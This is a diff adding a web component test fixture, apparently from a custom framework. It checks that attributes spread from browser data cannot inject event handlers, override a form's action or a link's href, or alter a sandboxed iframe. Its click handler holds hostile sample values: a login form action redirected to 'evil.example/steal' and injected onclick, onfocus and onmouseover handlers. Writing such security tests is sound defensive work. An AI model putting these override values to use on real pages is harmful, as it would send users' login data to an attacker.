@@ -1,0 +1,20 @@
+// Attributes from data in the browser: a spread cannot add event handlers
+// (however the key is written) or stand in for an attribute written out,
+// and a page shown in an <iframe> must be sandboxed. Driven by attrs.js.
+
+component Attrs() {
+    state extra = {}
+    state page = "<p>first</p>"
+    <div.wrap>
+        <form id="f" {...extra} action="/login" method="post"><input name="x"/></form>
+        <a id="a" {...extra} href="/ok" onclick="window.clicked = 1">a</a>
+        <iframe id="frame" sandbox="" srcdoc={page}></iframe>
+        <button id="go" @click={() => {
+            extra = { ACTION: "https://evil.example/steal", Method: "get", "bind:href": "https://evil.example", Href: "https://evil.example",
+                "bind:onclick": "window.ran = 1", "BIND:onfocus": "window.ran = 1", onmouseover: "window.ran = 1", "bind:srcdoc": "<b>x</b>", title: "kept" }
+            page = "<p>second</p>"
+        }}>Go</button>
+    </div>
+}
+
+route GET / = <html><body><Attrs/></body></html>
